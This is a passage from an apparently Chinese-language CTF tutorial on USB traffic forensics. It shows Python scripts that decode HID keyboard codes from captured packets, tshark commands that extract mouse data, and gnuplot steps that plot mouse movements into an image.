class="token punctuation">:</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span> <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span> <span class="token string">"e"</span><span class="token punctuation">,</span>    <span class="token string">"09"</span><span class="token punctuation">:</span> <span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span> <span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span> <span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span> <span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span> <span class="token string">"j"</span><span class="token punctuation">,</span>    <span class="token string">"0e"</span><span class="token punctuation">:</span> <span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span> <span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span> <span class="token string">"m"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span> <span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span> <span class="token string">"o"</span><span class="token punctuation">,</span>    <span class="token string">"13"</span><span class="token punctuation">:</span> <span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span> <span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span> <span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span> <span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span> <span class="token string">"t"</span><span class="token punctuation">,</span>    <span class="token string">"18"</span><span class="token punctuation">:</span> <span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span> <span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span> <span class="token string">"w"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span> <span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span> <span class="token string">"y"</span><span class="token punctuation">,</span>    <span class="token string">"1d"</span><span class="token punctuation">:</span> <span class="token string">"z"</span><span class="token punctuation">,</span> <span class="token string">"1e"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span> <span class="token string">"4"</span><span class="token punctuation">,</span>    <span class="token string">"22"</span><span class="token punctuation">:</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span> <span class="token string">"6"</span><span class="token punctuation">,</span> <span class="token string">"24"</span><span class="token punctuation">:</span> <span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token string">"25"</span><span class="token punctuation">:</span> <span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token string">"26"</span><span class="token punctuation">:</span> <span class="token string">"9"</span><span class="token punctuation">,</span>    <span class="token string">"27"</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token string">"28"</span><span class="token punctuation">:</span> <span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">:</span> <span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span> <span class="token string">"2a"</span><span class="token punctuation">:</span> <span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span> <span class="token string">"\t"</span><span class="token punctuation">,</span>    <span class="token string">"2c"</span><span class="token punctuation">:</span> <span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span> <span class="token string">"2d"</span><span class="token punctuation">:</span> <span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">"2e"</span><span class="token punctuation">:</span> <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token string">"2f"</span><span class="token punctuation">:</span> <span class="token string">"["</span><span class="token punctuation">,</span> <span class="token string">"30"</span><span class="token punctuation">:</span> <span class="token string">"]"</span><span class="token punctuation">,</span> <span class="token string">"31"</span><span class="token punctuation">:</span> <span class="token string">"\\"</span><span class="token punctuation">,</span>    <span class="token string">"32"</span><span class="token punctuation">:</span> <span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span> <span class="token string">"33"</span><span class="token punctuation">:</span> <span class="token string">";"</span><span class="token punctuation">,</span> <span class="token string">"34"</span><span class="token punctuation">:</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">"35"</span><span class="token punctuation">:</span> <span class="token string">"&lt;GA>"</span><span class="token punctuation">,</span> <span class="token string">"36"</span><span class="token punctuation">:</span> <span class="token string">","</span><span class="token punctuation">,</span> <span class="token string">"37"</span><span class="token punctuation">:</span> <span class="token string">"."</span><span class="token punctuation">,</span>    <span class="token string">"38"</span><span class="token punctuation">:</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"39"</span><span class="token punctuation">:</span> <span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span> <span class="token string">"3a"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span> <span class="token string">"3b"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span> <span class="token string">"3d"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span>    <span class="token string">"3e"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span> <span class="token string">"3f"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span> <span class="token string">"40"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span> <span class="token string">"41"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span> <span class="token string">"42"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span> <span class="token string">"43"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span>    <span class="token string">"44"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span> <span class="token string">"45"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F12>"</span><span class="token punctuation">&#125;</span>shiftKeys <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"04"</span><span class="token punctuation">:</span> <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span> <span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span> <span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span> <span class="token string">"E"</span><span class="token punctuation">,</span>    <span class="token string">"09"</span><span class="token punctuation">:</span> <span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span> <span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span> <span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span> <span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span> <span class="token string">"J"</span><span class="token punctuation">,</span>    <span class="token string">"0e"</span><span class="token punctuation">:</span> <span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span> <span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span> <span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span> <span class="token string">"O"</span><span class="token punctuation">,</span>    <span class="token string">"13"</span><span class="token punctuation">:</span> <span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span> <span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span> <span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span> <span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span> <span class="token string">"T"</span><span class="token punctuation">,</span>    <span class="token string">"18"</span><span class="token punctuation">:</span> <span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span> <span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span> <span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span> <span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span> <span class="token string">"Y"</span><span class="token punctuation">,</span>    <span class="token string">"1d"</span><span class="token punctuation">:</span> <span class="token string">"Z"</span><span class="token punctuation">,</span> <span class="token string">"1e"</span><span class="token punctuation">:</span> <span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span> <span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span> <span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span> <span class="token string">"$"</span><span class="token punctuation">,</span>    <span class="token string">"22"</span><span class="token punctuation">:</span> <span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span> <span class="token string">"^"</span><span class="token punctuation">,</span> <span class="token string">"24"</span><span class="token punctuation">:</span> <span class="token string">"&amp;"</span><span class="token punctuation">,</span> <span class="token string">"25"</span><span class="token punctuation">:</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"26"</span><span class="token punctuation">:</span> <span class="token string">"("</span><span class="token punctuation">,</span> <span class="token string">"27"</span><span class="token punctuation">:</span> <span class="token string">")"</span><span class="token punctuation">,</span>    <span class="token string">"28"</span><span class="token punctuation">:</span> <span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span> <span class="token string">"29"</span><span class="token punctuation">:</span> <span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span> <span class="token string">"2a"</span><span class="token punctuation">:</span> <span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span> <span class="token string">"\t"</span><span class="token punctuation">,</span> <span class="token string">"2c"</span><span class="token punctuation">:</span> <span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span>    <span class="token string">"2d"</span><span class="token punctuation">:</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token string">"2e"</span><span class="token punctuation">:</span> <span class="token string">"+"</span><span class="token punctuation">,</span> <span class="token string">"2f"</span><span class="token punctuation">:</span> <span class="token string">"&#123;"</span><span class="token punctuation">,</span> <span class="token string">"30"</span><span class="token punctuation">:</span> <span class="token string">"&#125;"</span><span class="token punctuation">,</span> <span class="token string">"31"</span><span class="token punctuation">:</span> <span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token string">"32"</span><span class="token punctuation">:</span> <span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span> <span class="token string">"33"</span><span class="token punctuation">:</span> <span class="token string">"\""</span><span class="token punctuation">,</span>    <span class="token string">"34"</span><span class="token punctuation">:</span> <span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"35"</span><span class="token punctuation">:</span> <span class="token string">"&lt;GA>"</span><span class="token punctuation">,</span> <span class="token string">"36"</span><span class="token punctuation">:</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">"37"</span><span class="token punctuation">:</span> <span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"38"</span><span class="token punctuation">:</span> <span class="token string">"?"</span><span class="token punctuation">,</span> <span class="token string">"39"</span><span class="token punctuation">:</span> <span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span> <span class="token string">"3a"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span>    <span class="token string">"3b"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span> <span class="token string">"3d"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span> <span class="token string">"3e"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span> <span class="token string">"3f"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span> <span class="token string">"40"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span>    <span class="token string">"41"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span> <span class="token string">"42"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span> <span class="token string">"43"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span> <span class="token string">"44"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span> <span class="token string">"45"</span><span class="token punctuation">:</span> <span class="token string">"&lt;F12>"</span><span class="token punctuation">&#125;</span>output <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>keys <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">and</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'2'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span>            <span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> \                line<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"00"</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token keyword">in</span> normalKeys<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            output <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>normalKeys<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>shiftKeys<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            output <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'[unknown]'</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>keys<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> output<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'&lt;DEL>'</span><span class="token punctuation">)</span>        <span class="token keyword">del</span> output<span class="token punctuation">[</span>a<span class="token punctuation">]</span>        <span class="token keyword">del</span> output<span class="token punctuation">[</span>a <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> output<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"&lt;CAP>"</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token number">1</span>            output<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>                flag <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">if</span> flag <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            output<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'output :'</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="鼠标流量"><a href="#鼠标流量" class="headerlink" title="鼠标流量"></a>鼠标流量</h2><blockquote><p><strong>鼠标流量的数据长度为 4 个字节</strong>，集中在 <code>Leftover Capture Data</code> 域的第 3 个字节中</p><ol><li>第 1 个字节代表按键，当取 0x00 时，代表没有按键；为 0x01 时，代表按左键，为 0x02 时，代表按右键</li><li>第 2 个字节可以看成是一个 signed byte 类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素</li><li>第 3 个字节与第 2 字节类似，代表垂直上下移动多少像素</li></ol></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-Misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%9011.png" alt="CTF-Misc_流量分析11.png"></p><p>与键盘流量类似，首先使用 <code>tshark</code> 提取鼠标数据：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tshark <span class="token parameter variable">-r</span> usb2.pcap <span class="token parameter variable">-T</span> fields <span class="token parameter variable">-e</span> usb.capdata <span class="token operator">></span> usbdata.txttshark <span class="token parameter variable">-r</span> usb2.pcap <span class="token parameter variable">-T</span> fields <span class="token parameter variable">-e</span> usb.capdata <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'/^\s*$/d'</span> <span class="token operator">></span> usbdata.txt <span class="token comment">#提取并去除空行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果提取出来的数据没有加冒号，使用脚本添加：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'usbdata.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>fi <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> a<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span> <span class="token comment"># 如果是键盘流量 len 改为 16</span>            out <span class="token operator">=</span> <span class="token string">''</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> i <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>                    out <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> a<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">":"</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    out <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> a<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>            fi<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span>            fi<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>fi<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试信息隐藏位置，根据脚本中 <code>btn_flag</code> 取何值时能得到一系列坐标来判断信息隐藏在鼠标左键还是右键中：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>keys <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'xy.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>posx <span class="token operator">=</span> <span class="token number">0</span>posy <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">12</span> <span class="token punctuation">:</span>        <span class="token keyword">continue</span>    x <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    y <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> x <span class="token operator">></span> <span class="token number">127</span> <span class="token punctuation">:</span>        x <span class="token operator">-=</span> <span class="token number">256</span>    <span class="token keyword">if</span> y <span class="token operator">></span> <span class="token number">127</span> <span class="token punctuation">:</span>        y <span class="token operator">-=</span> <span class="token number">256</span>    posx <span class="token operator">+=</span> x    posy <span class="token operator">+=</span> y    btn_flag <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 1 for left , 2 for right , 0 for nothing</span>    <span class="token keyword">if</span> btn_flag <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">:</span> <span class="token comment"># 1 代表左键</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>posx<span class="token punctuation">)</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>posy<span class="token punctuation">)</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 <code>gnuplot</code> 将 xy.txt 里的坐标转化成图像</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gnuplotgnuplot<span class="token operator">></span> plot <span class="token string">"xy.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果没有安装 <code>gnuplot</code> 手动安装即可（需要同时安装 <code>gnuplot</code> 和 <code>gnuplot-x11</code> 才能画出图）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> upgrade<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gnuplot 